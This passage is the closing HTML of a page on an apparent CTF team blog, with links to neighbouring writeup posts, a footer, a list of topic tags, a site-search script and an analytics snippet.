class="btn btn-outline-primary" prompt="Older"><p>Backdoor CTF 2023 Web Challenges</p></a> <a href="/posts/UofTCTF_2024/" class="btn btn-outline-primary" prompt="Newer"><p>UofTCTF 2024 Challenge Writeups</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://ctftime.org/team/179144">Ireland Without the RE</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/misc/">misc</a> <a class="post-tag" href="/tags/prototype-pollution/">prototype pollution</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
